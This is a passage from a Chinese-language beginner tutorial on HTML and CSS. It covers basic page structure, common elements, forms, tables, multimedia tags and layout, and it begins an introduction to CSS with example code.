class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>示例 HTML 页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎来到我的网站<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个简单的 HTML 页面。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>解释：</strong></p><ul><li><code>&lt;!DOCTYPE html&gt;</code>：声明文档类型，告知浏览器这是一个 HTML5 文档。</li><li><code>&lt;html&gt;</code>：HTML 文档的根元素。</li><li><code>&lt;head&gt;</code>：包含关于文档的信息（元数据），如标题、编码、样式等。</li><li><code>&lt;title&gt;</code>：网页的标题，显示在浏览器的标签页上。</li><li><code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>：设置文档的字符编码为 UTF-8，确保支持多语言字符集。</li><li><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>：响应式设计设置，适配移动设备。</li><li><code>&lt;body&gt;</code>：文档的主体，包含网页的可见内容。</li></ul><hr><h4 id="HTML-标记（标签）"><a href="#HTML-标记（标签）" class="headerlink" title="HTML 标记（标签）"></a>HTML 标记（标签）</h4><p>HTML 使用标记（标签）来表示网页的元素。HTML 标签通常成对出现，由开始标签和结束标签构成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;p&gt;</code> 是段落的开始标签。</li><li><code>&lt;/p&gt;</code> 是段落的结束标签。</li></ul><p>某些 HTML 标签是自闭合的，表示该元素没有内容，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;示例图片&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;img&gt;</code> 是图片标签，它没有结束标签。</li></ul><hr><h3 id="HTML-元素详解"><a href="#HTML-元素详解" class="headerlink" title="HTML 元素详解"></a>HTML 元素详解</h3><h4 id="标题（Headings）"><a href="#标题（Headings）" class="headerlink" title="标题（Headings）"></a>标题（Headings）</h4><p>HTML 提供了六种不同级别的标题标签，<code>&lt;h1&gt;</code> 到 <code>&lt;h6&gt;</code>，其中 <code>&lt;h1&gt;</code> 表示最大的标题，<code>&lt;h6&gt;</code> 表示最小的标题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是一级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>这是二级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这是三级标题<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure><p>标题的作用不仅是视觉上的层次结构，还会被搜索引擎用于页面索引，有助于 SEO 优化。</p><hr><h4 id="段落（Paragraphs）"><a href="#段落（Paragraphs）" class="headerlink" title="段落（Paragraphs）"></a>段落（Paragraphs）</h4><p>段落用 <code>&lt;p&gt;</code> 标签表示，用于将文本分成段落。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是第二个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>多个段落会自动在浏览器中分开显示。</p><hr><h4 id="链接（Links）"><a href="#链接（Links）" class="headerlink" title="链接（Links）"></a>链接（Links）</h4><p>链接是 HTML 中非常重要的元素，用于创建超链接，使用户可以在页面之间或外部网站之间导航。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span>点击访问示例网站<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>href</code> 属性指定了链接目标（URL）。</li><li>链接的文本是可点击的部分。</li></ul><p>你也可以使用 <code>target=&quot;_blank&quot;</code> 属性在新标签页中打开链接：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>在新标签页中打开<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="图像（Images）"><a href="#图像（Images）" class="headerlink" title="图像（Images）"></a>图像（Images）</h4><p>使用 <code>&lt;img&gt;</code> 标签来在网页中插入图像。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;描述图像&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>src</code> 属性指定图片的路径或 URL。</li><li><code>alt</code> 属性为图片提供文本替代，浏览器无法加载图像时显示，或用于屏幕阅读器。</li></ul><hr><h4 id="列表（Lists）"><a href="#列表（Lists）" class="headerlink" title="列表（Lists）"></a>列表（Lists）</h4><p>HTML 提供了两种主要的列表：有序列表和无序列表。</p><ul><li><strong>无序列表</strong> 使用 <code>&lt;ul&gt;</code> 和 <code>&lt;li&gt;</code> 标签：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目一<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目二<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目三<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>有序列表</strong> 使用 <code>&lt;ol&gt;</code> 和 <code>&lt;li&gt;</code> 标签：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h3><p>HTML 表单允许用户输入数据，并通过提交数据与服务器进行交互。</p><h4 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h4><p>HTML 提供了多种表单元素，包括文本框、单选按钮、复选框、下拉菜单等。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/submit&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span>邮箱：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;gender&quot;</span>&gt;</span>性别：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;male&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;female&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;gender&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span>女<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby&quot;</span>&gt;</span>爱好：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby1&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;阅读&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby1&quot;</span>&gt;</span>阅读<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hobby2&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobby[]&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;运动&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;hobby2&quot;</span>&gt;</span>运动<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>input</code> 标签表示用户输入字段。</li><li><code>label</code> 标签与表单元素关联，点击标签会聚焦到相应的输入字段。</li><li><code>input type=&quot;submit&quot;</code> 用于创建提交按钮。</li></ul><hr><h4 id="表单提交"><a href="#表单提交" class="headerlink" title="表单提交"></a>表单提交</h4><ul><li><code>action</code> 属性指定了表单提交的目标 URL。</li><li><code>method</code> 属性定义了提交方式（GET 或 POST）。</li></ul><p>当用户填写表单并点击提交按钮后，表单中的数据会被发送到服务器进行处理。</p><hr><h3 id="HTML-表格"><a href="#HTML-表格" class="headerlink" title="HTML 表格"></a>HTML 表格</h3><p>表格用来展示结构化的数据，表格的基本元素包括 <code>&lt;table&gt;</code>、<code>&lt;tr&gt;</code>（表格行）、<code>&lt;th&gt;</code>（表头）、<code>&lt;td&gt;</code>（表格单元格）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>城市<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>28<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>北京<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>32<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>上海<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;th&gt;</code> 用于表头，默认是加粗且居中的。</li><li><code>&lt;td&gt;</code> 用于表格的每个单元格。</li><li><code>border=&quot;1&quot;</code> 为表格添加边框。</li></ul><hr><h3 id="HTML-多媒体"><a href="#HTML-多媒体" class="headerlink" title="HTML 多媒体"></a>HTML 多媒体</h3><p>HTML 支持嵌入多媒体文件如音频和视频。</p><h4 id="嵌入音频"><a href="#嵌入音频" class="headerlink" title="嵌入音频"></a>嵌入音频</h4><p>使用 <code>&lt;audio&gt;</code> 标签嵌入音频文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;audio.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>    您的浏览器不支持音频标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>controls</code> 属性为音频播放器添加播放控制按钮。</li></ul><h4 id="嵌入视频"><a href="#嵌入视频" class="headerlink" title="嵌入视频"></a>嵌入视频</h4><p>使用 <code>&lt;video&gt;</code> 标签嵌入视频文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>    您的浏览器不支持视频标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>width</code> 和 <code>height</code> 设置视频的显示尺寸。</li></ul><hr><h3 id="HTML-基本布局"><a href="#HTML-基本布局" class="headerlink" title="HTML 基本布局"></a>HTML 基本布局</h3><p>在网页布局中，可以使用 HTML 的块级元素和行内元素</p><p>来设计结构。常用的布局元素包括：</p><ul><li><strong>块级元素</strong>：<code>&lt;div&gt;</code>、<code>&lt;header&gt;</code>、<code>&lt;footer&gt;</code>、<code>&lt;section&gt;</code>、<code>&lt;article&gt;</code> 等，默认独占一行。</li><li><strong>行内元素</strong>：<code>&lt;span&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code> 等，默认不会换行。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>网站标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/about&quot;</span>&gt;</span>关于<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/contact&quot;</span>&gt;</span>联系我们<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>主要内容区域<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这里是文章内容。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> 2024 网站版权所有<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;header&gt;</code> 用于页面头部。</li><li><code>&lt;nav&gt;</code> 用于导航栏。</li><li><code>&lt;section&gt;</code> 表示页面中的一个内容块。</li><li><code>&lt;footer&gt;</code> 用于页面底部。</li></ul><hr><h3 id="CSS-详尽入门与指南"><a href="#CSS-详尽入门与指南" class="headerlink" title="CSS 详尽入门与指南"></a>CSS 详尽入门与指南</h3><p><strong>CSS（Cascading Style Sheets，层叠样式表）</strong> 是用来描述 HTML 元素如何在屏幕上展示的样式语言。通过使用 CSS，你可以控制网页的布局、颜色、字体、对齐方式、动画等。CSS 是构建美观、现代网页的核心技术之一，结合 HTML 使用，可以创建出复杂且灵活的网页样式</p><hr><h3 id="目录-5"><a href="#目录-5" class="headerlink" title="目录"></a>目录</h3><ol><li><a href="#css-%E5%9F%BA%E7%A1%80">CSS 基础</a><ul><li><a href="#%E5%BC%95%E5%85%A5-css">引入 CSS</a></li><li><a href="#css-%E8%AF%AD%E6%B3%95">CSS 语法</a></li></ul></li><li><a href="#%E9%80%89%E6%8B%A9%E5%99%A8%E8%AF%A6%E8%A7%A3">选择器详解</a><ul><li><a href="#%E9%80%9A%E7%94%A8%E9%80%89%E6%8B%A9%E5%99%A8">通用选择器</a></li><li><a href="#%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">元素选择器</a></li><li><a href="#%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">类选择器</a></li><li><a href="#id-%E9%80%89%E6%8B%A9%E5%99%A8">ID 选择器</a></li><li><a href="#%E5%B1%9E%E6%80%A7%E9%80%89%E6%8B%A9%E5%99%A8">属性选择器</a></li><li><a href="#%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">伪类选择器</a></li><li><a href="#%E4%BC%AA%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">伪元素选择器</a></li></ul></li><li><a href="#css-%E7%9B%92%E6%A8%A1%E5%9E%8B">CSS 盒模型</a><ul><li><a href="#%E7%9B%92%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D">盒模型介绍</a></li><li><a href="#%E8%BE%B9%E8%B7%9Dmargin">边距（Margin）</a></li><li><a href="#%E5%A1%AB%E5%85%85padding">填充（Padding）</a></li><li><a href="#%E8%BE%B9%E6%A1%86border">边框（Border）</a></li><li><a href="#%E5%86%85%E5%AE%B9%E5%8C%BA%E5%9F%9F">内容区域</a></li></ul></li><li><a href="#css-%E5%B8%83%E5%B1%80">CSS 布局</a><ul><li><a href="#%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E4%B8%8E%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0">块级元素与行内元素</a></li><li><a href="#%E6%B5%AE%E5%8A%A8%E5%B8%83%E5%B1%80float">浮动布局（Float）</a></li><li><a href="#%E5%BC%B9%E6%80%A7%E7%9B%92%E6%A8%A1%E5%9E%8Bflexbox">弹性盒模型（Flexbox）</a></li><li><a href="#%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80grid">网格布局（Grid）</a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81-css-%E5%B1%9E%E6%80%A7">常见 CSS 属性</a><ul><li><a href="#%E6%96%87%E6%9C%AC%E6%A0%B7%E5%BC%8F">文本样式</a></li><li><a href="#%E8%83%8C%E6%99%AF%E6%A0%B7%E5%BC%8F">背景样式</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%8E%E5%8F%AF%E8%A7%81%E6%80%A7">显示与可见性</a></li></ul></li><li><a href="#css-%E5%8A%A8%E7%94%BB%E4%B8%8E%E8%BF%87%E6%B8%A1">CSS 动画与过渡</a></li><li><a href="#%E5%93%8D%E5%BA%94%E5%BC%8F%E8%AE%BE%E8%AE%A1">响应式设计</a><ul><li><a href="#%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2">媒体查询</a></li></ul></li><li><a href="#css-%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7">CSS 优化技巧</a></li></ol><hr><h3 id="CSS-基础"><a href="#CSS-基础" class="headerlink" title="CSS 基础"></a>CSS 基础</h3><h4 id="引入-CSS"><a href="#引入-CSS" class="headerlink" title="引入 CSS"></a>引入 CSS</h4><p>在 HTML 中，你可以通过多种方式引入 CSS，最常用的有以下三种方式：</p><ol><li><strong>内联样式</strong>：在 HTML 元素的 <code>style</code> 属性中直接定义样式。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red;&quot;</span>&gt;</span>这是红色的文字<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong>内部样式表</strong>：将 CSS 写在 HTML 文件的 <code>&lt;style&gt;</code> 标签内，位于 <code>&lt;head&gt;</code> 部分。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span 